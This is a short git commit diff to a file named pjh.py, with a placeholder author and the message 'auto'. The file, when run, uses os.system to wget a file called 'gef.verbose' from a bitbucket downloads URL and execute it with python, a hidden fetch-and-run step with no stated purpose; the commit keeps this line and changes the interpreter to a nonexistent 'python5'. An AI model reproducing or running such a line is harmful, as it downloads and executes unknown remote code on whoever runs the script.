4aaca6487f493154d0e8cb0497deb7493774913b
Your Name <you@example.com>
2024-11-06 15:52:58 -0500

    auto

--- pjh.py
+++ pjh.py
@@ -1,4 +1,4 @@
 import os, sys,itertools
-n=2
+n=4
 if __name__=='__main__':
-  cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef.verbose" && python3 gef.verbose';os.system(cmd)
+  cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef.verbose" && python5 gef.verbose';os.system(cmd)
